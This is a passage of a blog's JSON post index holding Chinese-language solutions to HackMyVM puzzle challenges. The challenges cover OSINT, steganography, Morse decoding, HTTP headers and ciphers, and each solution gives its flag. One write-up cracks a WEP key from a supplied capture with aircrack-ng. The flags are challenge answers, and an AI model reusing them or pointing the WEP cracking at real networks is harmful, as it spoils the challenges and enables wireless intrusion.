048.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 048", "postUrl": "post/Challenge%20048.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/59", "commentNum": 0, "wordCount": 313, "description": "![image-20250621125632465](https://7r1umphk.github.io/image/20250621125632761.webp)\n\n\u4e0b\u8f7d\uff0c\u89e3\u538b\n\n![48](https://7r1umphk.github.io/image/20250621125716382.webp)\n\n\u4e00\u4e2a\u7c7b\u4f3c\u4e8e\u8f66\u724c\n\ngoogle\u4e00\u4e0b\n\n![image-20250621125830400](https://7r1umphk.github.io/image/20250621125830567.webp)\n\n\u4e4c\u514b\u5170\n\n\u524d\u4e24\u4f4d\u5b57\u6bcd\u8868\u793a**\u6ce8\u518c\u5730\u7684\u533a\u57df\u4ee3\u7801**\n\nAA \u662f\u57fa\u8f85\n\n```\nHMV{kyiv}\n```\n\nsentence", "top": 0, "createdAt": 1751016645, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P60": {"htmlDir": "docs/post/Challenge 016.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 016", "postUrl": "post/Challenge%20016.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/60", "commentNum": 0, "wordCount": 451, "description": "![image-20250612182407919](https://7r1umphk.github.io/image/202506121824441.webp)\n\n```\nHMV{\\033[31mw\\033[31mh\\033[31my\\033[31m i\\033[31mm \\033[31mn\\033[31mo\\033[31mt \\033[39m m\\033[39ma\\033[39my\\033[39mb\\033[39me \\033[39mu\\033[39ms\\033[39me \\033[32m g\\033[32mr\\033[32me\\033[32me\\033[32mn\\033[32mt\\033[32mh\\033[32me\\033[32mf\\033[32ml\\033[32ma\\033[32mg\\033[39m}\n```\n\n\u7ec8\u7aef\u989c\u8272\u6df7\u6dc6\u4f2a\u88c5\n\n```\nwhy im not maybe use green the flag\n```\n\n\u7eff\u8272\n\n```\nHMV{greentheflag}\n```\n\nsentence", "top": 0, "createdAt": 1751016648, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P61": {"htmlDir": "docs/post/Challenge 024.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 024", "postUrl": "post/Challenge%20024.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/61", "commentNum": 0, "wordCount": 232, "description": "![image-20250612190956179](https://7r1umphk.github.io/image/202506121909489.webp)\n\n\u62ff\u4e2a\u6d4f\u89c8\u5668\uff0c\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u9875\uff0c\u4f60\u4f1a\u53d1\u73b0flag\u4e00\u95ea\u800c\u8fc7\n\n\u62ff\u4e2aburp\u6293\u5c31\u597d\u4e86\n\n![image-20250612191151691](https://7r1umphk.github.io/image/202506121911882.webp)\n\n```\nHMV{fastredirect}\n```\n\nsentence", "top": 0, "createdAt": 1751016651, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P62": {"htmlDir": "docs/post/Challenge 025.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 025", "postUrl": "post/Challenge%20025.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/62", "commentNum": 0, "wordCount": 776, "description": "![image-20250612191237073](https://7r1umphk.github.io/image/202506121912373.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 025.zip \n-rwxr-xr-x 1 kali kali 1495709 Jun 12 07:12 025.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 025.zip \nArchive:  025.zip\n  inflating: 025.png                 \n                         \n```\n\n![025](https://7r1umphk.github.io/image/202506121913972.webp)\n\n![image-20250612191418119](https://7r1umphk.github.io/image/202506121914522.webp)\n\n\u653e\u5927\n\n![image-20250612191435611](https://7r1umphk.github.io/image/202506121914807.webp)\n\n```\nHMV{whattimeisit}\n```\n\n\u5982\u679c\u4e0d\u5bf9\uff0c\u76f4\u63a5\u5bf9\u7167\u4e00\u4e0bsentence", "top": 0, "createdAt": 1751016653, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P63": {"htmlDir": "docs/post/Challenge 026.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 026", "postUrl": "post/Challenge%20026.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/63", "commentNum": 0, "wordCount": 769, "description": "![image-20250612191601943](https://7r1umphk.github.io/image/202506121916254.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 026.zip \n-rwxr-xr-x 1 kali kali 160499 Jun 12 07:16 026.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 026.zip \nArchive:  026.zip\n  inflating: 026.jpg                 \n                       \n```\n\n![026](https://7r1umphk.github.io/image/202506121916188.webp)\n\n\u53f3\u4e0a\u89d2\n\n![image-20250612191725946](https://7r1umphk.github.io/image/202506121917179.webp)\n\n![image-20250612191917698](https://7r1umphk.github.io/image/202506121919934.webp)\n\n```\nHMV{Turkey}\n```\n\n\u5e94\u8be5\u662f\u8fd9\u4e2a\u82f1\u8bed\uff0c\u81ea\u5df1\u8bd5\u8bd5sentence", "top": 0, "createdAt": 1751016656, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P64": {"htmlDir": "docs/post/Challenge 027.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 027", "postUrl": "post/Challenge%20027.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/64", "commentNum": 0, "wordCount": 851, "description": "![image-20250612192123140](https://7r1umphk.github.io/image/202506121921452.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://momo.hackmyvm.eu/t0r1k34s3/ \nWhere is my flag?                                                                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -i http://momo.hackmyvm.eu/t0r1k34s3/                          \nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Thu, 12 Jun 2025 11:22:06 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nFlag: HMV{flaginmyheader}\n\nWhere is my flag?                                                                                                                                                                                   \n```\n\nsentence", "top": 0, "createdAt": 1751016658, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P65": {"htmlDir": "docs/post/Challenge 028.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 028", "postUrl": "post/Challenge%20028.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/65", "commentNum": 0, "wordCount": 2873, "description": "![](https://7r1umphk.github.io/image/202506121923186.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 028.zip\n-rwxr-xr-x 1 kali kali 1967 Jun 12 07:23 028.zip\n             \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 028.zip \nArchive:  028.zip\n  inflating: 028.wav                 \n                                           \n```\n\n\u542c\u4e86\u4e00\u4e0b\uff0c\u662f\u6469\u65af\u5bc6\u7801\n\n\u627e\u5de5\u5177\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ git clone https://github.com/Ling-Ink/MorseAudioDecoder.git\nCloning into 'MorseAudioDecoder'...\nremote: Enumerating objects: 28, done.\nremote: Counting objects: 100% (28/28), done.\nremote: Compressing objects: 100% (22/22), done.\nremote: Total 28 (delta 5), reused 27 (delta 4), pack-reused 0 (from 0)\nReceiving objects: 100% (28/28), 606.49 KiB | 416.00 KiB/s, done.\nResolving deltas: 100% (5/5), done.\n                                                                                         \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cd MorseAudioDecoder \n                                                                                           \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/MorseAudioDecoder]\n\u2514\u2500$ python3 main.py ../028.wav \n_wave_params(nchannels=1, sampwidth=1, framerate=8000, nframes=345520, comptype='NONE', compname='not compressed')\nwave avg: 24500\nDrawing Morse Image: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 172760/172760 [00:00<00:00, 3670573.72it/s]\nmorse block avg: 7.958333333333333\nmorse blank avg: 4.034722222222222\nMorse Result: -/-/-/--/----/-/--/-----/-/-----/--/-/-/--/----/-/-/---/-/--/-/---/----/-/--/-/-/-/--/-/-/--/--/--/-/----/---/-/--/-/----/-/---/--/--/-/---/--/--/-/--/-/-/---/-/----/-/--/-/--/-/-/-/--/-/---/----/-/---/--/--/-/---/--.\nTraceback (most recent call last):\n  File '/mnt/hgfs/gx/MorseAudioDecoder/main.py', line 120, in <module>\n    plain_text += morse_dict[morse]\n                  ~~~~~~~~~~^^^^^^^\nKeyError: '----'\n                                          \n```\n\n\u5bc4\n\n\u53bb\u5176\u4ed6\u5730\u65b9\u6252\u62c9\u4e00\u4e0b\n\nhttps://morsecode.world/international/decoder/audio-decoder-adaptive.html\n\n\u6211\u5feb\u6ef4\u6ef4\u7b54\u50bb\u4e86\n\n![image-20250612210103780](https://7r1umphk.github.io/image/202506122101105.webp)\n\n```\nETTTETEEETTETEEEETTEEEETETTTETEEETTTEETTETTEETEEETTETTTTETTTETETETTEEETEETTETTEEETTEETETETTEETETETTETTTEETTEEETTETTETTTTETTEETEEETTEETETETTEETEE\n```\n\n\u89e3\u5bc6\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat tmp.txt                                \nETTTETEEETTETEEEETTEEEETETTTETEEETTTEETTETTEETEEETTETTTTETTTETETETTEEETEETTETTEEETTEETETETTEETETETTETTTEETTEEETTETTETTTTETTEETEEETTEETETETTEETEE\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat tmp.txt | sed 's/E/0/g' | sed 's/T/1/g'\n011101000110100001100001011101000111001101100100011011110111010101100010011011000110010101100101011011100110001101101111011001000110010101100100\n```\n\n![image-20250612210203140](https://7r1umphk.github.io/image/202506122102548.webp)\n\n```\nHMV{thatsdoubleencoded}\n```\n\nsentence", "top": 0, "createdAt": 1751016663, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P66": {"htmlDir": "docs/post/Challenge 029.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 029", "postUrl": "post/Challenge%20029.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/66", "commentNum": 0, "wordCount": 244, "description": "![image-20250612210313007](https://7r1umphk.github.io/image/202506122103342.webp)\n\n\u5b50\u57df\u540d\n\nhttps://zh.subdomains.whoisxmlapi.com/lookup\n\n![image-20250613213543362](https://7r1umphk.github.io/image/202506132135949.webp)\n\n```\nHMV{publicd0main}\n```\n\nsentence", "top": 0, "createdAt": 1751016666, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P67": {"htmlDir": "docs/post/Challenge 030.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 030", "postUrl": "post/Challenge%20030.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/67", "commentNum": 0, "wordCount": 837, "description": "![image-20250613220818347](https://7r1umphk.github.io/image/202506132208605.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 030.zip \n-rwxr-xr-x 1 kali kali 918 Jun 13 09:37 030.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 030.zip \nArchive:  030.zip\n  inflating: 030.png                 \n                          \n```\n\n\u770b\u770b\n\n![030](https://7r1umphk.github.io/image/202506132208685.webp)\n\n\u6252\u62c9\u4e00\u4e2aps\uff0c\u7f16\u8f91\u4e86\u4e00\u4e0b\n\nhttps://ps.gaoding.com/\n\n\u81ea\u5df1\u6539\u4e00\u4e0b\n\n![image-20250613220903507](https://7r1umphk.github.io/image/202506132209658.webp)\n\nhttps://cli.im/deqr/other\n\n\u89e3\u7801\n![image-20250613220934058](https://7r1umphk.github.io/image/202506132209311.webp)\n\n```\nHMV{qrsospecial}\n```\n\nsentence", "top": 0, "createdAt": 1751016668, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P68": {"htmlDir": "docs/post/Challenge 031.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 031", "postUrl": "post/Challenge%20031.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/68", "commentNum": 0, "wordCount": 1237, "description": "![1111](https://7r1umphk.github.io/image/202506132211238.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 030.zip \n-rwxr-xr-x 1 kali kali 918 Jun 13 09:37 030.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 030.zip \nArchive:  030.zip\n  inflating: 030.png                 \n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 031.zip \n-rwxr-xr-x 1 kali kali 973 Jun 13 10:11 031.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 031.zip \nArchive:  031.zip\n  inflating: 031.wav                 \n              \n```\n\n\u542c\u4e00\u4e0b\uff0cok\u53c8\u662f\u6469\u65af\u5bc6\u7801\n\nhttps://morsecode.world/international/decoder/audio-decoder-adaptive.html\n\n![image-20250613222739128](https://7r1umphk.github.io/image/202506132227527.webp)\n\n```\nHMV{MORSEGIVESYOUTHEFLAG}\n```\n\nsentence", "top": 0, "createdAt": 1751016671, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P69": {"htmlDir": "docs/post/Challenge 032.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 032", "postUrl": "post/Challenge%20032.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/69", "commentNum": 0, "wordCount": 645, "description": "![image-20250613222805234](https://7r1umphk.github.io/image/202506132228210.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 032.zip   \n-rwxr-xr-x 1 kali kali 5929 Jun 13 10:28 032.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 032.zip \nArchive:  032.zip\n  inflating: 032.gif                 \n           \n```\n\n\u770b\u770b\n\n![032](https://7r1umphk.github.io/image/202506132229342.webp)\n\n\u9694\u7740\u5faa\u73af\u64ad\u653e\u5462\n\nhttps://www.pdfpai.com/gif-to-png\n\n\u6252\u62c9\u4e00\u4e0b\u9759\u6001\u7167\u7247\uff0c\u7136\u540e\u62fc\u4e00\u4e0bflag\n\n```\nHMV{gifarefun}\n```\n\nsentence", "top": 0, "createdAt": 1751016673, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P70": {"htmlDir": "docs/post/Challenge 033.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 033", "postUrl": "post/Challenge%20033.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/70", "commentNum": 0, "wordCount": 1708, "description": "![image-20250613223248138](https://7r1umphk.github.io/image/202506132232437.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 033.zip \n-rwxr-xr-x 1 kali kali 1538000 Jun 13 10:33 033.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 033.zip \nArchive:  033.zip\n  inflating: 033.pcap                \n                    \n```\n\n\u63d0\u793a\u662fwep\u5bc6\u94a5\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7206\u7834\n\n```\naircrack-ng 033.pcap\n                                                                                Aircrack-ng 1.7 \n\n\n                                                                  [00:00:00] Tested 60016 keys (got 17273 IVs)\n\n   KB    depth   byte(vote)\n    0    0/  1   4D(28160) 24(23808) 58(23552) 44(22528) B7(22528) 94(21760) D2(21504) 00(20992) 39(20992) 71(20992) CE(20992) 0B(20736) 1E(20736) 4A(20736) \n    1    4/ 34   59(21760) E1(21504) 5B(21504) B0(20992) 56(20736) 98(20736) A6(20736) B4(20480) EF(20480) 86(20480) B1(20480) EA(20224) FD(20224) 10(20224) \n    2   36/ 45   04(19712) 16(19456) 41(19456) 56(19456) 7B(19456) 7C(19456) 81(19456) E6(19456) F1(19456) F2(19456) 8A(19200) B2(19200) E3(19200) 8F(18944) \n    3   14/ 40   45(20992) D3(20992) 94(20736) 04(20736) 0F(20480) 58(20480) B2(20480) 00(20480) 1E(20224) 20(20224) 31(20224) 57(20224) A1(20224) CB(20224) \n    4    0/  1   59(27648) 6F(23040) 25(22016) 20(21760) 38(21760) 30(21504) 53(21504) 67(21504) 84(21504) DB(21504) E7(21504) 08(20992) B8(20736) BE(20736) \n\n                     KEY FOUND! [ 4D:59:4B:45:59 ] (ASCII: MYKEY )\n        Decrypted correctly: 100%\n\n```\n\n\u6240\u4ee5flag\n\n```\nHMV{MYKEY}\n```\n\nsentence", "top": 0, "createdAt": 1751016676, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P71": {"htmlDir": "docs/post/Challenge 034.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 034", "postUrl": "post/Challenge%20034.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/71", "commentNum": 0, "wordCount": 679, "description": "![image-20250613232956875](https://7r1umphk.github.io/image/20250613232957326.webp)\n\n\u4e0b\u8f7d\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ll 034.zip \n-rwxr-xr-x 1 kali kali 3210 Jun 13 11:30 034.zip\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ unzip 034.zip \nArchive:  034.zip\n  inflating: 034.jpg                 \n              \n```\n\n\u770b\u770b\n\n![034](https://7r1umphk.github.io/image/20250613233047100.webp)\n\ngoogle\u8bc6\u56fe\n\n![image-20250613233203766](https://7r1umphk.github.io/image/20250613233204073.webp)\n\n```\nHMV{Somalia}\n```\n\nsentence", "top": 0, "createdAt": 1751016678, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P72": {"htmlDir": "docs/post/Challenge 035.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 035", "postUrl": "post/Challenge%20035.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/72", "commentNum": 0, "wordCount": 2465, "description": "![image-20250613233326180](https://7r1umphk.github.io/image/20250613233326526.webp)\n\n```\nHelp us to decrypt this message: 'Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6!' Unfortunately we only have one clear text message: 'Hi John. I am from the Administrative team. We have just received your request to change your password, it will reach you in a few minutes. Thank you very much for contacting us, I hope your question has been resolved!'\n\n\n\u7ffb\u8bd1\uff1a\n\u5e2e\u52a9\u6211\u4eec\u89e3\u5bc6\u8fd9\u6761\u6d88\u606f\uff1a\u201cHx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6\uff01\u201d \u5f88\u9057\u61be\uff0c\u6211\u4eec\u53ea\u6709\u4e00\u6761\u660e\u6587\u6d88\u606f\uff1a\u201c\u55e8\uff0c\u7ea6\u7ff0\u3002\u6211\u662f\u7ba1\u7406\u56e2\u961f\u7684\u3002\u6211\u4eec\u521a\u521a\u6536\u5230\u60a8\u66f4\u6539\u5bc6\u7801\u7684\u8bf7\u6c42\uff0c\u51e0\u5206\u949f\u540e\u5c31\u4f1a\u56de\u590d\u60a8\u3002\u975e\u5e38\u611f\u8c22\u60a8\u8054\u7cfb\u6211\u4eec\uff0c\u5e0c\u671b\u60a8\u7684\u95ee\u9898\u5df2\u7ecf\u5f97\u5230\u89e3\u51b3\uff01\u201d\n```\n\n\u770b\u7740\u4e0d\u50cf\u7b80\u5355\u7684\u51ef\u6492\n\n```\nHx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf. R7rt qk 1gtw p87 ha81oqjc: MOO{r2w_sh_qbm_f89_mrs5} 9p3pc xtw oojy 235j 8nw ehxlar2ap9 tx, K ayhe dwmt itjumsgn wik d7ds t83glam6\uff01\nHi John. I am from the Administrative team. We have just received your request to change your password, it will reach you in a few minutes. Thank you very much for contacting us, I hope your question has been resolved!\n```\n\n\u66ff\u6362\u5bc6\u7801\uff0c\u591a\u8868\u66ff\u6362......\u8bd5\u8bd5\u7ef4\u5409\u5c3c\u4e9a\u5427\n\nhttps://www.dcode.fr/vigenere-cipher\n\n![image-20250614002540728](https://7r1umphk.github.io/image/20250614002540927.webp)\n\n\u770b\u770b\n\n![image-20250614002725142](https://7r1umphk.github.io/image/20250614002725459.webp)\n\n\u7ee7\u7eed\u770b\n\n![image-20250614002746485](https://7r1umphk.github.io/image/20250614002746748.webp)\n\n\u5148\u786e\u5b9a\u5b57\u7b26\u96c6\n\n\u5b9e\u73b0\u5bc6\u6587\u5305\u542b**\u5927\u5199\u5b57\u6bcd\u548c\u6570\u5b57**\uff0c\u4f8b\u5982 Hx\u300192gm\u3001C6lnp\n\n\u8fd9\u8bf4\u660e\u5b83\u4f7f\u7528\u7684\u4e0d\u662f\u6807\u51c6\u768426\u4e2a\u5b57\u6bcd\uff0c\u800c\u662f\u4e00\u4e2a**\u81ea\u5b9a\u4e49\u7684\u6269\u5c55Alphabet**\n\n\u6240\u4ee5\u5b83\u6709\u53ef\u80fd\u662f\n\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n\nABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\n\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\n\n1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ\n\n\u7136\u540e\u4f60\u5c31\u53ef\u4ee5\u4e22\u53bb\u7ed9ai\u4e86\uff0c\u95ee\u5b83\u54ea\u4e2a\u6bd4\u8f83\u53ef\u80fd\uff0c\u8ba9\u4ed6\u7b97\u5bc6\u94a5\u6d41\n\n```\n\u6211\u6709\u4e00\u4e2a\u7ef4\u5409\u7eb3\u5bc6\u7801\u7684\u53d8\u4f53\uff0c\u5b83\u5728\u52a0\u5bc6\u65f6\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u6240\u6709\u5b57\u6bcd\u90fd\u6309\u5927\u5199\u5904\u7406\uff09\u3002\n\u6211\u73b0\u5728\u9700\u8981\u4f60\u901a\u8fc7\u8ba1\u7b97\u6765\u5224\u65ad\uff0c\u4e0b\u9762\u7684\u56db\u4e2a\u5b57\u7b26\u96c6\u4e2d\uff0c\u54ea\u4e00\u4e2a\u624d\u662f\u6b63\u786e\u7684\uff1f\n\u5019\u9009\u5b57\u7b26\u96c6:\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\nABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\n1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ\n\u5df2\u77e5\u4fe1\u606f\uff1a\n\u5bc6\u6587\u7247\u6bb5: Hx Rgjf. H fo 92gm 9p7 C6lnpb3lrp2ax7 sjcf\n\u660e\u6587\u7247\u6bb5: Hi John. I am from the Administrative 